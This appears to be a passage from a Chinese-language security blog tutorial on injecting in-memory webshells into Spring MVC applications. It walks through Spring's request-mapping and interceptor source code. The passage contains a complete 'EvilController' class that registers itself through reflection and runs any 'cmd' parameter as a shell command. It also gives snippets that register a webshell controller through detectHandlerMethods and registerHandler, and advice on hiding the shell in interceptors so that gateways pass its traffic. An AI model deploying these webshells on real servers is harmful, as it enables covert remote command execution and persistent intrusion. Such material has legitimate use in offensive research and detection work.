<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据传入的元素（类或方法）创建对应的 RequestMappingInfo。</span></span><br><span class="line"><span class="comment"> * 实际工作委托给 &#123;<span class="doctag">@link</span> #createRequestMappingInfo(RequestMapping, RequestCondition)&#125;，</span></span><br><span class="line"><span class="comment"> * 同时根据“类/方法”选择合适的自定义匹配条件（RequestCondition）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 逻辑说明：</span></span><br><span class="line"><span class="comment"> * 1) 使用 AnnotatedElementUtils.findMergedAnnotation 查找并“合并” <span class="doctag">@RequestMapping</span>：</span></span><br><span class="line"><span class="comment"> *    - 支持直接标注、元注解（meta-annotation）以及层级合并（含 <span class="doctag">@AliasFor</span> 处理）。</span></span><br><span class="line"><span class="comment"> * 2) 如果 element 是 Class，则取类级别的自定义条件；如果是 Method，则取方法级别的自定义条件。</span></span><br><span class="line"><span class="comment"> * 3) 若找到了 <span class="doctag">@RequestMapping</span>，则构建 RequestMappingInfo；否则返回 null（表示该元素无映射）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #getCustomTypeCondition(Class)   // 提供类级别的自定义匹配条件扩展点</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #getCustomMethodCondition(Method) // 提供方法级别的自定义匹配条件扩展点</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">private</span> RequestMappingInfo <span class="title function_">createRequestMappingInfo</span><span class="params">(AnnotatedElement element)</span> &#123;</span><br><span class="line">    <span class="comment">// 合并查找 @RequestMapping（支持组合注解与属性别名）</span></span><br><span class="line">    <span class="type">RequestMapping</span> <span class="variable">requestMapping</span> <span class="operator">=</span></span><br><span class="line">            AnnotatedElementUtils.findMergedAnnotation(element, RequestMapping.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 针对类/方法分别获取对应的自定义条件（可由子类覆盖以扩展匹配维度，如版本、租户等）</span></span><br><span class="line">    RequestCondition&lt;?&gt; condition = (element <span class="keyword">instanceof</span> Class</span><br><span class="line">            ? getCustomTypeCondition((Class&lt;?&gt;) element)</span><br><span class="line">            : getCustomMethodCondition((Method) element));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若存在 @RequestMapping，则创建 RequestMappingInfo；否则返回 null</span></span><br><span class="line">    <span class="keyword">return</span> (requestMapping != <span class="literal">null</span> ? createRequestMappingInfo(requestMapping, condition) : <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>由于 <code>RequestMappingHandlerMapping#getMappingForMethod()</code> 方法不是 <code>public</code> 修饰的方法，所以需要使用反射调用。</p>
</li>
</ul>
<p>综上，可得到另一种通用 Controller 内存马的实现方式：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> EvilController.class.getDeclaredMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">getMappingForMethod</span> <span class="operator">=</span> r.getClass().getDeclaredMethod(<span class="string">&quot;getMappingForMethod&quot;</span>, Method.class, Class.class);</span><br><span class="line">            getMappingForMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span></span><br><span class="line">                    (RequestMappingInfo) getMappingForMethod.invoke(r, method, EvilController.class);</span><br><span class="line"></span><br><span class="line">            r.registerMapping(info, <span class="keyword">new</span> <span class="title class_">EvilController</span>(), method);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/shell&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">b64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(Repository.lookupClass(EvilController.class).getBytes());</span><br><span class="line">        System.out.println(b64.length());</span><br><span class="line">        System.out.println(b64);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="detectHandlerMethods"><a href="#detectHandlerMethods" class="headerlink" title="detectHandlerMethods"></a>detectHandlerMethods</h5><p>在上面分析注册流程时，<code>detectHandlerMethods</code> 中，用 <code>getMappingForMethod</code> 获取了 <code>RequestMappingInfo</code>，然后调用 <code>registerHandlerMethod</code> 方法。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在指定的“处理器 Bean”中查找处理方法（handler methods）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> handler 可以是 Bean 名称（String），也可以是实际的处理器实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #getMappingForMethod</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">detectHandlerMethods</span><span class="params">(Object handler)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 根据传入类型确定处理器的“类”：</span></span><br><span class="line">    <span class="comment">//    - 如果是 String，则视为 beanName，用 ApplicationContext#getType 预测类型（避免立刻实例化）；</span></span><br><span class="line">    <span class="comment">//    - 如果是实例，则直接取实例的 Class。</span></span><br><span class="line">    Class&lt;?&gt; handlerType = (handler <span class="keyword">instanceof</span> String ?</span><br><span class="line">            obtainApplicationContext().getType((String) handler) : handler.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handlerType != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 2) 获取“用户真实类”（去掉 CGLIB/JDK 代理壳，拿到原始业务类）</span></span><br><span class="line">        Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 选择当前类中所有“有映射”的方法：</span></span><br><span class="line">        <span class="comment">//    MethodIntrospector.selectMethods 会遍历 userType 的可检查方法，并通过 MetadataLookup 回调</span></span><br><span class="line">        <span class="comment">//    为每个方法计算“映射信息 T”（子类定义的 T，例如 RequestMappingHandlerMapping 中是 RequestMappingInfo）。</span></span><br><span class="line">        Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType,</span><br><span class="line">                (MethodIntrospector.MetadataLookup&lt;T&gt;) method -&gt; &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 3.1 计算该方法对应的映射信息（可能综合类级、方法级 @RequestMapping 及其它条件）</span></span><br><span class="line">                        <span class="keyword">return</span> getMappingForMethod(method, userType);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">                        <span class="comment">// 3.2 如果标注不合法或解析失败，抛出更明确的异常（包含类名与方法签名）</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid mapping on handler class [&quot;</span> +</span><br><span class="line">                                userType.getName() + <span class="string">&quot;]: &quot;</span> + method, ex);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 打印映射日志：TRACE 级别更详细；否则用 mappingsLogger 的 DEBUG 级别</span></span><br><span class="line">        <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">            logger.trace(formatMappings(userType, methods));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappingsLogger.isDebugEnabled()) &#123;</span><br><span class="line">            mappingsLogger.debug(formatMappings(userType, methods));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 对每个“有映射”的方法进行最终注册</span></span><br><span class="line">        methods.forEach((method, mapping) -&gt; &#123;</span><br><span class="line">            <span class="comment">// 5.1 选择可调用的方法（考虑 AOP 代理、桥接方法/泛型擦除、接口方法到实现类方法的映射等）</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">invocableMethod</span> <span class="operator">=</span> AopUtils.selectInvocableMethod(method, userType);</span><br><span class="line">            <span class="comment">// 5.2 将 (handler, method, mapping) 注册到映射注册表（mappingRegistry）</span></span><br><span class="line">            <span class="comment">//     之后就能通过 URL/HTTP 方法等条件路由到该方法</span></span><br><span class="line">            registerHandlerMethod(handler, invocableMethod, mapping);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里由于 <code>detectHandlerMethods</code> 为 <code>protect</code> 作用域，因此需要通过反射调用该方法（在使用该方法注册 Controller 的时候，我们构造的恶意 Controller 需要用注解指定路径，例如 <code>@RequestMapping(&quot;/shell&quot;)</code>）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在上下文中注册一个名为 dynamicController 的 Webshell controller</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>, Class.forName(<span class="string">&quot;org.example.springmvc.InjectedController&quot;</span>).newInstance());</span><br><span class="line"><span class="comment">//从上下文中获得 RequestMappingHandlerMapping</span></span><br><span class="line">org.springframework.web.servlet.mvc.method.annotation.<span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class);</span><br><span class="line"><span class="comment">//反射获得 detectHandlerMethods Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(<span class="string">&quot;detectHandlerMethods&quot;</span>, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//通过反射将 dynamicController 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(requestMappingHandlerMapping, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h5 id="registerHandler"><a href="#registerHandler" class="headerlink" title="registerHandler"></a>registerHandler</h5><p>上面两种方法适用于 spring3.1 之后，<code>RequestMappingHandlerMapping</code> 为映射器时。</p>
<p>如下面的配置，当有些老旧的项目中使用旧式注解映射器时，上下文环境中没有 <code>RequestMappingHandlerMapping</code> 实例的 bean，但会存在 <code>DefaultAnnotationHandlerMapping</code> 的实例 bean。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><strong>Spring 2.5 开始到 Spring 3.1</strong> 之前一般使用 <code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code> 映射器 ；</p>
<p><strong>Spring 3.1</strong> 开始及以后一般开始使用新的 <code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code> 映射器来支持 <code>@Contoller</code> 和 <code>@RequestMapping</code> 注解。</p>
</blockquote>
<p>当使用 <code>DefaultAnnotationHandlerMapping</code> 作为映射器时，可以使用该类顶层父类的 <code>registerHandler</code> 方法来注册 Controller，但是不太常用了。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在上下文中注册一个名为 dynamicController 的 Webshell controller</span></span><br><span class="line">context.getBeanFactory().registerSingleton(<span class="string">&quot;dynamicController&quot;</span>, Class.forName(<span class="string">&quot;org.example.springmvc.InjectedController&quot;</span>).newInstance());</span><br><span class="line"><span class="comment">//从上下文中获得 DefaultAnnotationHandlerMapping</span></span><br><span class="line">org.springframework.web.servlet.mvc.annotation.<span class="type">DefaultAnnotationHandlerMapping</span>  <span class="variable">dh</span> <span class="operator">=</span> context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class);</span><br><span class="line"><span class="comment">//反射获得 registerHandler Method</span></span><br><span class="line">java.lang.reflect.<span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(<span class="string">&quot;registerHandler&quot;</span>, String.class, Object.class);</span><br><span class="line">m1.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//将 dynamicController 和 URL 注册到 handlerMap 中</span></span><br><span class="line">m1.invoke(dh, <span class="string">&quot;/favicon&quot;</span>, <span class="string">&quot;dynamicController&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="Interceptor-内存马"><a href="#Interceptor-内存马" class="headerlink" title="Interceptor 内存马"></a>Interceptor 内存马</h3><p>随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器之前往往需要经过 Load Balancer 和 API Gateway 等系统的流量转发。这样就导致在漏洞利用时可能会出现一个问题：如果请求的 url 是没有在网关系统注册的路由，在请求转发到真正的业务系统前就会被丢弃。</p>
<p>所以，在注入 Java 内存马时，尽量不要使用新的路由来专门处理我们注入的 Webshell 逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们 webshell 逻辑的处理。在 Tomcat 容器下，有 Filter、Listener 可以达到上述要求。在 SpringMVC 框架层面下，Interceptor（拦截器） 可以满足要求.</p>
<h4 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h4><h5 id="Interceptor-执行流程"><a href="#Interceptor-执行流程" class="headerlink" title="Interceptor 执行流程"></a>Interceptor 执行流程</h5><p>在前面分析的 <code>org.springframework.web.servlet.DispatcherServlet#doDispatch</code> 方法中，还调用了 <code>org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle</code> 方法：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进 <code>applyPreHandle</code>，可以看到里面遍历调用了 <code>interceptor</code> 的 <code>preHande</code> 方法，如果其中有拦截器返回 <code>false</code> 就会返回。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 依次执行已注册拦截器（HandlerInterceptor）的 preHandle 方法。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回 true 表示“允许继续”——进入下一个拦截器或最终的 handler；</span></span><br><span class="line"><span class="comment"> *         返回 false 表示“中断后续流程”——认为当前拦截器已自行处理了响应（如重定向/写回错误），</span></span><br><span class="line"><span class="comment"> *         DispatcherServlet 不再调用后续拦截器或目标 handler。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">applyPreHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 按注册顺序遍历拦截器列表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.interceptorList.size(); i++) &#123;</span><br><span class="line">        <span class="type">HandlerInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> <span class="built_in">this</span>.interceptorList.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用当前拦截器的前置方法。</span></span><br><span class="line">        <span class="comment">// 约定：返回 true → 放行；返回 false → 终止调度（本拦截器已处理完响应）</span></span><br><span class="line">        <span class="keyword">if</span> (!interceptor.preHandle(request, response, <span class="built_in">this</span>.handler)) &#123;</span><br><span class="line">            <span class="comment">// 若有拦截器返回 false：立即触发 afterCompletion（清理/收尾）；</span></span><br><span class="line">            <span class="comment">// 这里传入的异常为 null，表示是“正常中断”而非异常抛出。</span></span><br><span class="line">            triggerAfterCompletion(request, response, <span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录“最后一个成功执行了 preHandle 的拦截器索引”，</span></span><br><span class="line">        <span class="comment">// 以便之后在触发 postHandle/afterCompletion 时，仅对 [0..index] 范围的拦截器调用。</span></span><br><span class="line">        <span class="built_in">this</span>.interceptorIndex = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 全部 preHandle 都返回 true：允许继续进入 handler（或之后的 postHandle 流程）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="Interceptor-注册流程"><a href="#Interceptor-注册流程" class="headerlink" title="Interceptor 注册流程"></a>Interceptor 注册流程</h5><p>这里主要分析的是 Spring 在处理一次请求时初始化要调用的 Interceptor 列表的过程。</p>
<p><code>doDispatch</code> 函数调用 <code>getHandler</code> 时有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMapping.getHandlerExecutionChain(AbstractHandlerMapping.java:604)</span><br><span class="line">at org.springframework.web.servlet.handler.AbstractHandlerMapping.getHandler(AbstractHandlerMapping.java:516)</span><br><span class="line">at org.springframework.web.servlet.DispatcherServlet.getHandler(DispatcherServlet.java:1266)</span><br><span class="line">at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1048)</span><br></pre></td></tr></table></figure></div>

<p>跟进 <code>getHandlerExecutionChain</code>，该方法遍历取出 <code>adapedInterceptor</code> 中的 <code>intercepter</code>，如果该 <code>interceptor</code> 符合条件，就添加到 <code>chain</code> 中（和 Tomcat 中的 <code>FilterChain</code> 也是比较像的）。</p>
